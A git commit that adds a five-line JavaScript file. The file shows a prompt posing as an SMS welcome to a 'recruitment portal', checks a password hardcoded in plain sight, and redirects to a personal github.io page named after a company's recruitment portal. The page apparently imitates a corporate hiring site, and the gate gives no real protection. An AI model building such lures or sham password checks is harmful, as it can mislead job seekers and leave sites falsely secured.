acc0caab786cd98b27e604e73bd1d302209ed0bd
allregnws <promisebassey8081@gmail.com>
2025-06-01 19:58:13 +0100

    Create jb.js

---
+++ jb.js
@@ -0,0 +1,5 @@
+var password = 'BOTASH'
+password=prompt('SMS :Welcome to our recruitment portal. Click OK to start your application ','BOTASH');
+if (password != 'BOTASH') {
+location.href='https://allregnws.github.io/BOTASH.Recruitment.Portal.bw';
+}
